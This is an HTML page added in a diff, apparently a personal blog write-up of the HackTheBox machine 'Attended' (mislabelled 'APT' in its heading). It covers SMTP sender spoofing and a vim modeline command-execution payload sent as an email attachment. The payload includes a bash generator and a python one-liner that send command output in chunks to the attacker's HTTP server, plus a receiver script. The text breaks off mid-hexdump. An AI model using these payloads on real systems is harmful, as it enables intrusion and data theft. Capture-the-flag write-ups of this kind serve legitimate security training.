@@ -1,0 +1,2204 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    
+    
+    <meta property="article:tag" content="hackthebox" />
+    
+    <meta property="article:tag" content="htb" />
+    
+    <meta property="article:tag" content="boot2root" />
+    
+    <meta property="article:tag" content="writeup" />
+    
+    <meta property="article:tag" content="linux" />
+    
+    <meta property="article:tag" content="Attended" />
+    
+    <meta property="article:tag" content="attended" />
+    
+    <meta property="article:tag" content="SMTP" />
+    
+    <meta property="article:tag" content="OpenSMTPD" />
+    
+    <meta property="article:tag" content="Vim" />
+    
+    <meta property="article:tag" content="vim modelines" />
+    
+    <meta property="article:tag" content="modelines" />
+    
+    <meta property="article:tag" content="SSH" />
+    
+    <meta property="article:tag" content="AuthorizedKeysCommand" />
+    
+    <meta property="article:tag" content="ProxyCommand" />
+    
+    <meta property="article:tag" content="authkeys" />
+        
+
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="HTB Attended">
+    <meta name="twitter:description" content="10.10.10.221 | 50 pts">
+    <meta name="twitter:site" content="@jebidiah-anthony" />
+    <meta name="twitter:creator" content="@feeeellliix">
+
+    
+    <meta property="og:image" content="https://jebidiah-anthony.github.io/boxes/screenshots/73_Attended/Attended.png" />
+    
+
+    
+    <meta property="og:title" content="HTB Attended" />
+    
+
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>HTB Attended | jebidiah-anthony</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="HTB Attended" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="10.10.10.221 50 pts" />
+<meta property="og:description" content="10.10.10.221 50 pts" />
+<link rel="canonical" href="https://jebidiah-anthony.github.io/boxes/73_Attended.html" />
+<meta property="og:url" content="https://jebidiah-anthony.github.io/boxes/73_Attended.html" />
+<meta property="og:site_name" content="jebidiah-anthony" />
+<script type="application/ld+json">
+{"description":"10.10.10.221 50 pts","@type":"WebPage","headline":"HTB Attended","url":"https://jebidiah-anthony.github.io/boxes/73_Attended.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <style>
+      .user_host { color: green; }
+      .sys_dir { color: #779ECB; }
+      p { color:#aaa; }
+      header { margin-bottom: 0px; }
+      .header .navbtn {
+	position: fixed;
+	width: 0px;
+	visibility: hidden;
+      }
+      .header .title { 
+	padding-left: 69px;
+	vertical-align: middle;
+      }
+      .header .title h2 { margin: 0; } 
+
+      .container {
+	max-width: 1200px;
+      }
+      .sidebar {
+        border-right: 1px dashed #b5e853;
+	bottom: 0;
+        height: 100%;
+	overflow: auto;
+	padding: 10px 10px 10px 10px;
+        position: fixed;
+	top: 0;
+        width: 230px;
+      }
+      .openbtn { 
+	color:#b5e853;
+	font-size:30px;
+	cursor:pointer
+      }
+      .closebtn {
+	color:#b5e853;
+	font-size:69px;
+	cursor:pointer;
+	position:absolute;
+	top:0;
+	right:25px;
+	font-size:36px;
+	margin-left:50px;
+	visibility:hidden;
+      }
+      
+      .ctf_content {
+        margin-left: 250px;
+	padding-bottom: 5px;
+      }
+      .ctf_content h2 {	padding: 20px 0px 0px 10px; }
+      .ctf_content h3 { margin: 20px 0px 0px 10px; }
+      .ctf_content img {
+ 	display: block;
+	margin-left: auto;
+	margin-right: auto;
+	max-width: 100%;
+	padding: 0 10px 0 0;
+      }
+      .ctf_content table { padding: 0 15px; }
+
+      #main_content h1 { padding: 20px 0px 0px 8px; }
+      #main_content h2, p, pre { 
+	padding-right:10px;
+	padding-left:15px; 
+      }
+      #main_content h4 { 
+        margin: 20px 0px 10px 0px; 
+        padding-left: 25px; 
+      }
+      #main_content ol, ul { margin: 0 0 0 10px; }
+
+      .highlighter-rouge { padding: 0 10px 0 10px; }
+
+      .section-divider{
+        border-bottom: 1.5px solid #b5e853;
+        padding-top:28px;
+        width:55%;
+      }
+      
+      @media screen and (min-width: 801px) {
+	.ctf_content {
+          margin-left: 250px;
+	  padding-bottom: 5px;
+        }
+      }
+      @media screen and (max-width: 800px) {
+        header {
+	  background-color: #202020;
+	  height: 80px;
+	  padding: 0px 0 0 0;
+	  position: fixed;
+	  top: 0;
+	}
+        .header .navbtn {
+          height: 80px;
+	  padding: 18px 0 0 20px;
+          visibility: visible;
+	  width: 100px;
+        }
+	.header .title { padding-left: 100px; }
+	.header .title h1 { padding-top: 5px; }
+        .header .title h2 { margin: 0; }
+
+	.container {
+	  width:100%;
+	}
+	.sidebar {
+          width: 0;
+          z-index: 1;
+          overflow-x: hidden;
+	  padding: 0;
+          transition: 0.5s;
+	}
+	.sidebar h2 { 
+	  font-size: 18px; 
+	  padding: 10px 10px 5px 10px;
+	}
+	.sidebar div { 
+	  font-size: 15px; 
+	  padding: 5px 10px 5px 10px;
+	}
+	.closebtn { visibility:visible; }
+
+	.highlighter-rouge { padding: 0 0 0 0; }
+
+	.ctf_content {
+	  margin: 0;
+	}
+	.ctf_content h2 { padding: 15px 0px 0px 5px; }
+        .ctf_content h3 { margin: 15px 10px 0px 15px; }
+        .ctf_content img {
+	  max-width: 100%;
+	  padding: 0 10px 0 0;
+        }
+	.ctf_content table { 
+	  margin: 0 10px 0px -8px;
+	  min-width: 800px;
+	}
+
+        #main_content { margin-top:80px; }
+	#main_content code { font-size: 15px; }
+	#main_content h1 { font-size: 25px; }
+	#main_content h2 { font-size: 22px; }
+	#main_content h3 { font-size: 18px; }
+	#main_content h4 { padding-left: 20px; }
+	#main_content ol, ul {
+	  font-size: 14px;
+	  margin: 0 0 0 12px;
+	  padding: 0 0 0 25px;
+	}
+	#main_content table { font-size: 14px; }
+      }
+
+      @media screen and (max-width: 480px) {
+        header {
+	  background-color: #202020;
+	  height: 70px;
+	  padding: 0px 0 0 0;
+	  position: fixed;
+	  top: 0;
+	}
+        .header .navbtn {
+          height: 70px;
+	  padding: 14px 0 0 18px;
+        }
+	.header .title { padding-left: 100px; }
+	.header .title h1 { font-size:22px; }
+        .header .title h2 { font-size:16px; }
+
+	#main_content code { font-size: 13px; }
+        #main_content ol, ul {
+	  font-size: 13px;
+	  margin: 0 0 0 12px;
+	  padding: 0 0 0 25px;
+	}
+	#main_content table { font-size: 13px; }
+      }
+    </style>
+
+  </head>
+
+  <body>
+    <div class="container">
+       <div id="sidebar" class="sidebar">
+         <span class="closebtn" onclick="closeNav()">&times;</span>      
+	 <div><h2 style="margin-bottom:0; padding-top:20px">[SITE PAGES]</h2>
+
+<div style="padding-top:10px">
+  
+  > <a href="/">whoami</a>
+  
+</div>
+<div style="padding-top:10px">  
+  >  <a href="/htb.html">
+    
+    <strong style="color:orange">htb writeups</strong>
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="/ctf.html">
+    
+    ctf writeups
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="/projects.html">
+    
+    projects
+    
+  </a>
+</div>
+</div>
+	 <div style="padding-bottom:20px">
+           
+             <h2 style="margin-bottom:0; padding-top: 20px">[HTB BOXES]</h2>
+
+
+<div style="padding-top:10px">
+  
+  > <strong style="color:orange">Attended</strong>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/66_APT.html">APT</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/49_Unbalanced.html">Unbalanced</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/62_Travel.html">Travel</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/61_Quick.html">Quick</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/38_Bitlab.html">Bitlab</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/33_Safe.html">Safe</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/32_Ellingson.html">Ellingson</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/31_WriteUp.html">WriteUp</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/30_swagshop.html">swagshop</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/29_kryptos.html">kryptos</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/28_Luke.html">Luke</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/26_CTF.html">CTF</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/25_Friendzone.html">Friendzone</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/24_Flujab.html">Flujab</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/23_Help.html">Help</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/22_Chaos.html">Chaos</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/21_Lightweight.html">Lightweight</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/20_Irked.html">Irked</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/19_Teacher.html">Teacher</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/15_Mischief.html">Mischief</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/14_Waldo.html">Waldo</a>
+  
+</div>
+
+
+
+	   
+	 </div>
+       </div>
+       <div id="content" class="ctf_content">
+	 <header>
+           <div class="header">
+             <div class="navbtn">
+               <span class="openbtn" onclick="openNav()">&#9776;</span>
+	     </div>
+	     <div class="title">
+               <h1>jebidiah-anthony</h1>
+               <h2 style="padding:0 0 0 0">write-ups and what not</h2>
+	     </div>
+           </div>
+         </header>
+         <section id="main_content"><div class="paragraph">
+<p><h1 style="color:red"> HTB APT (10.10.10.221) </h1></p>
+</div>
+<hr>
+<hr>
+<div class="sect1">
+<h2 id="part-1-initial-recon">PART 1 : INITIAL RECON</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="1-1-nmap-scan">1.1 NMAP scan</h3>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>nmap <span class="nt">--min-rate</span> 3000 <span class="nt">-oN</span> nmap-tcp.initial <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">-v</span> 10.10.10.221
+
+  PORT   STATE SERVICE
+  22/tcp open  ssh
+  25/tcp open  smtp
+
+<span class="nv">$ </span>nmap <span class="nt">-oN</span> nmap-tcp <span class="nt">-p</span> 22,25 <span class="nt">-Pn</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> 10.10.10.221
+
+  PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+  | ssh-hostkey:
+  |   3072 4f:08:48:10:a2:89:3b:bd:4a:c6:81:03:cb:20:04:f5 <span class="o">(</span>RSA<span class="o">)</span>
+  |   256 1a:41:82:21:9f:07:9d:cd:61:97:e7:fe:96:3a:8f:b0 <span class="o">(</span>ECDSA<span class="o">)</span>
+  |_  256 e0:6e:3d:52:ca:5a:7b:4a:11:cb:94:ef:af:49:07:aa <span class="o">(</span>ED25519<span class="o">)</span>
+  25/tcp open  smtp
+  | fingerprint-strings:
+  |   GenericLines, GetRequest:
+  |     220 proudly setup by guly <span class="k">for </span>attended.htb ESMTP OpenSMTPD
+  |     5.5.1 Invalid <span class="nb">command</span>: Pipelining not supported
+  |   Hello:
+  |     220 proudly setup by guly <span class="k">for </span>attended.htb ESMTP OpenSMTPD
+  |     5.5.1 Invalid <span class="nb">command</span>: EHLO requires domain name
+  |   Help:
+  |     220 proudly setup by guly <span class="k">for </span>attended.htb ESMTP OpenSMTPD
+  |     214- This is OpenSMTPD
+  |     214- To report bugs <span class="k">in </span>the implementation, please contact bugs@openbsd.org
+  |     214- with full details
+  |     2.0.0: End of HELP info
+  |   NULL:
+  |_    220 proudly setup by guly <span class="k">for </span>attended.htb ESMTP OpenSMTPD
+  | smtp-commands: proudly setup by guly <span class="k">for </span>attended.htb Hello nmap.scanme.org <span class="o">[</span>10.10.14.28], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP,
+  |_ This is OpenSMTPD To report bugs <span class="k">in </span>the implementation, please contact bugs@openbsd.org with full details 2.0.0: End of HELP info</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<hr>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-2-port-enumeration">PART 2 : PORT ENUMERATION</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="2-1-tcp-port-22-openssh">2.1 TCP PORT 22 (OpenSSH)</h3>
+<div class="paragraph">
+<p>Failing to login three times lets us see what authentication methods are accepted when attempting to SSH into the box:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>ssh 10.10.10.221
+
+  kali@10.10.10.221<span class="s1">'s password:
+  Permission denied, please try again.
+  kali@10.10.10.221'</span>s password:
+  Permission denied, please try again.
+  kali@10.10.10.221<span class="s1">'s password:
+  kali@10.10.10.221: Permission denied (publickey,password,keyboard-interactive).</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>It seems like nothing unusual is needed to authenticate.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="2-2-tcp-port-25-opensmtpd">2.2 TCP PORT 25 (OpenSMTPD)</h3>
+<div class="paragraph">
+<p>Looking at the banner when trying to access the OpenSMTPD service via <strong><code>telnet</code></strong>, a user (guly) and domain (attended.htb) are seen. And, when you try to verify if it is an existing email address, the server responds with <strong><code>250 Recipient Ok</code></strong>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>telnet 10.10.10.221 25
+
+  220 proudly setup by <span class="c"><mark>guly</mark> for <mark>attended.htb</mark> ESMTP OpenSMTPD</span>
+  HELO jebidiah
+  250 proudly setup by guly <span class="k">for </span>attended.htb Hello jebidiah <span class="o">[</span>10.10.14.28], pleased to meet you
+  MAIL FROM:&lt;jebidiah&gt;
+  553 5.1.0: Sender address syntax error
+  MAIL FROM:&lt;<span class="nb">test</span>@jebidiah.htb&gt;
+  250 2.0.0: Ok
+  RCPT TO:&lt;guly@attended.htb&gt;
+  250 2.1.5 Destination address valid: Recipient ok</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Now starting a local SMTP server to check if guly replies to emails:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">sudo </span>python <span class="nt">-m</span> smtpd <span class="nt">-c</span> DebuggingServer <span class="nt">-n</span> 10.10.14.8:25</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Not to begin sending an email:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>swaks <span class="nt">--to</span> <span class="s2">"guly@attended.htb"</span> <span class="nt">--from</span> <span class="s2">"jebidiah@10.10.14.8"</span> <span class="nt">--body</span> <span class="s2">"something"</span> <span class="nt">--server</span> 10.10.10.221</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>We get the following reply saying that guly is currently working on an inssue with someone named, freshness and will only entertain emails coming from him:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="eml">hello, thanks for writing.
+i'm currently quite busy working on an issue with freshness and dodging any email from everyone but him. i'll get back in touch as soon as possible.
+
+
+---
+guly
+
+OpenBSD user since 1995
+Vim power user
+
+/"\
+\ /  ASCII Ribbon Campaign
+ X   against HTML e-mail
+/ \  against proprietary e-mail attachments</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Trying to impersonate freshness using <strong><code>swaks</code></strong>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>swaks <span class="nt">--to</span> <span class="s2">"guly@attended.htb"</span> <span class="nt">--from</span> <span class="s2">"freshness@10.10.14.8"</span> <span class="nt">--body</span> <span class="s2">"something"</span> <span class="nt">--server</span> 10.10.10.221</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Now, the response says that now, guly needs to receive an attachment. And also, python2 is installed in the gateway which only allows RFC compliant connections (e.g. SMTP, ICMP, HTTP, etc.):</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="eml">hi mate, could you please double check your attachment? looks like you forgot to actually attach anything :)
+
+p.s.: i also installed a basic py2 env on gw so you can PoC quickly my new outbound traffic restrictions. i think it should stop any non RFC compliant connection.
+
+
+---
+guly
+
+OpenBSD user since 1995
+Vim power user
+
+/"\
+\ /  ASCII Ribbon Campaign
+ X   against HTML e-mail
+/ \  against proprietary e-mail attachments</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Trying to create an attachment then sending it to guly as freshness:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">echo test</span> <span class="o">&gt;</span> test.txt
+
+<span class="nv">$ </span>swaks <span class="nt">--to</span> <span class="s2">"guly@attended.htb"</span> <span class="nt">--from</span> <span class="s2">"freshness@10.10.14.8"</span> <span class="nt">--body</span> <span class="s2">"something"</span> <span class="nt">--attach</span> test.txt <span class="nt">--server</span> 10.10.10.221</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>I get notified that that attachment I sent as going to be opened in vim and that freshness' configuration file should be in <strong><code>/home/shared/</code></strong>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="eml">thanks dude, i'm currently out of the office but will SSH into the box immediately and open your attachment with vim to verify its syntax.
+if everything is fine, you will find your config file within a few minutes in the /home/shared folder.
+test it ASAP and let me know if you still face that weird issue.
+
+
+---
+guly
+
+OpenBSD user since 1995
+Vim power user
+
+/"\
+\ /  ASCII Ribbon Campaign
+ X   against HTML e-mail
+/ \  against proprietary e-mail attachments</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The following are everything we&#8217;ve gotten from the email exchange above:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Only emails from freshness will be entertained.</p>
+</li>
+<li>
+<p>Only RPC compliant protocols for outbound traffic will be allowed which means simple socket connections (for reverse shells) will not work.</p>
+</li>
+<li>
+<p>Python2 could be used and the sent attachment will be opened using <strong><code>vim</code></strong>.</p>
+</li>
+<li>
+<p>A config file should be in <strong><code>/home/shared/</code></strong>.</p>
+</li>
+</ul>
+</div>
+<hr>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-3-exploitation">PART 3 : EXPLOITATION</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="3-1-vim-modelines">3.1 VIM MODELINES</h3>
+<div class="paragraph">
+<p>While searching for code execution exploits in vim, I came across <a href="https://securitynews.sonicwall.com/xmlpost/vim-modelines-remote-command-execution-dec-23-2016/">CVE-2016-1248</a> which is Arbitrary Command Execution using vim modelines. However, it was discovered around 2016 and a newer exploit (<a href="https://medium.com/@knownsec404team/vim-neovim-arbitrary-code-execution-via-modelines-cve-2002-1377-cve-2016-1248-cve-2019-12735-c769a97dfccf">CVE-2019-12735</a>) was found on 2019.</p>
+</div>
+<div class="paragraph">
+<p>What happens when modelines is enabled in vim is that when the file contains the following line:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">:!&lt;<span class="nb">command</span><span class="o">&gt;</span> <span class="o">||</span><span class="s2">" vi:fen:fdm=expr:fde=assert_fails("</span><span class="nb">source</span><span class="se">\!\ \%</span><span class="s2">"):fdl=0:fdt="</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The command will execute before proceeding to the actual file contents.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="3-2-payload-creation">3.2 PAYLOAD CREATION</h3>
+<div class="paragraph">
+<p>There are a few challenges to overcome since only RPC compliant protocols are allowed for outbound connections so first, I created an automated vim modeline payload generator using bash:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="bash">#!/bin/bash
+
+echo "[x] CREATING PAYLOAD";
+cmd=$1;
+payload=":!python2 -c 's=__import__(\"subprocess\").Popen(\"$cmd\", shell=True, stdout=-1).communicate()[0].strip(); [__import__(\"requests\").get(\"http://10.10.14.8/\", params={len(s):\"\".join([format(ord(x), \"02x\") for x in s[3000*i:3000*(i+1)]])}) for i in range(0,int(__import__(\"math\").floor(float(len(s))/3000))+1)]' ||\" vi:fen:fdm=expr:fde=assert_fails(\"source\!\ \%\"):fdl=0:fdt=\"";
+
+echo $payload > cmd.txt
+echo $payload;
+
+echo "[x] SENDING PAYLOAD AS ATTACHMENT"
+
+swaks --to "guly@attended.htb" --from "freshness@10.10.14.28" --body "ggwp" --attach cmd.txt --server 10.10.10.221 2>/dev/null
+
+echo "[x] CLEANING UP"
+rm cmd.txt</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>This incorporates a python2 one-liner which when expanded looks like the following:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python">import math
+import requests
+import subprocess
+
+s = subprocess.Popen("<command>", shell=True, stdout=-1).communicate()[0].strip()
+
+for i in range(0, int(math.floor(float(len(s))/3000))+1):
+    params = { len(s): "".join([format(ord(x), "02x") for x in s[3000*i:3000*(i+1)]])}
+    requests.get("http://10.10.14.8/", params=params)</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>What it essentially does is to chunk the response to a maximum of 3000 bytes per request since there seems to be a limit to how much data I could send back to my server.</p>
+</div>
+<div class="paragraph">
+<p>After which, I created an HTTP Server that will be used to exfiltrate the responses from the machine and since I&#8217;m chunking the requests, the following code will manage with rebuilding the response:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python">from http.server import SimpleHTTPRequestHandler
+from socketserver import TCPServer
+from urllib.parse import unquote, urlparse
+
+global content
+content = dict()
+def http_server(host_port):
+
+    class CustomHandler(SimpleHTTPRequestHandler):
+        def do_GET(self) -> None:
+            self.send_response(200)
+
+            params_get = urlparse(self.path).query.split('&')
+            for i in params_get:
+                param = i.split("=",1)
+                if param[0] in content:
+                    content[param[0]] += bytes.fromhex(param[1]).decode("utf-8")
+                else:
+                    content[param[0]] = bytes.fromhex(param[1]).decode("utf-8")
+
+            for i in content:
+                if int(i) == len(content[i]):
+                    print(content[i])
+                    print("==============================================")
+                    del content[i]
+
+            self.send_header("Content-Type", "text/plain")
+            self.end_headers()
+            return
+
+    class Server(TCPServer): allow_reuse_address = True
+
+    httpd = Server(host_port, CustomHandler)
+    httpd.serve_forever()
+
+def main():
+    try: http_server(('0.0.0.0', 80))
+    except KeyboardInterrupt: pass
+
+if __name__ == "__main__": main()</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+</div>
+<div class="sect2">
+<h3 id="3-3-remote-code-execution">3.3 REMOTE CODE EXECUTION</h3>
+<div class="paragraph">
+<p>Start the created HTTP Server:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ sudo python3 server.py 2>/dev/null</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Then, begin sending commands then wait until the HTTP server reflects the output:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ ./cmd.sh id</code></pre>
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">uid=1000(guly) gid=1000(guly) groups=1000(guly)</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<hr>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-4-getting-a-user-shell-freshness">PART 4 : GETTING A USER SHELL (freshness)</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="4-1-enumerating-using-the-rce">4.1 ENUMERATING USING THE RCE</h3>
+<div class="paragraph">
+<p>Checking for all the users that have a directory in <strong><code>/home</code></strong>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ ./cmd.sh "ls -la /home"</code></pre>
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">total 20
+drwxr-xr-x   5 root       wheel      512 Jun 26  2019 .
+drwxr-xr-x  13 root       wheel      512 May  8 11:05 ..
+drwxr-x---   4 freshness  freshness  512 Nov 12 16:56 freshness
+drwxr-x---   4 guly       guly       512 May  8 15:12 guly
+drwxrwx-wx   2 root       freshness  512 Dec 11 22:25 shared</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The config file mentionedd earlier should be in <strong><code>/home/shared</code></strong> but the directory doesn&#8217;t seem to have global read permissions, however exploring guly&#8217;s home directory:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ ./cmd.sh "ls -la /home/guly/tmp"</code></pre>
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">total 32
+drwxr-xr-x  2 guly  guly    512 Jun 26  2019 .
+drwxr-x---  4 guly  guly    512 May  8 15:23 ..
+-rwxr-x---  1 guly  guly  12288 Jun 26  2019 .config.swp</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>There is a <strong><code>.config.swp</code></strong> file (.swp files are usually created when a file is opened in vim and will serve as a backup until the opened file is closed). Since this is a binary file, it can&#8217;t be exfiltrated by simply outputting the file:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ ./cmd.sh "cat /home/guly/tmp/.config.swp | xxd -p | tr -d '\n'"</code></pre>
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">623056494d20382e3100000000100000000000000000000074ac000067756c79000000000000000000000000000000000000000000000000000000000000000000000000617474656e6465642e687462000000000000000000000000000000000000000000000000000000007e67756c792f746d702f2e7373682f636f6e666967000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d5533323130000000002322212013125500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000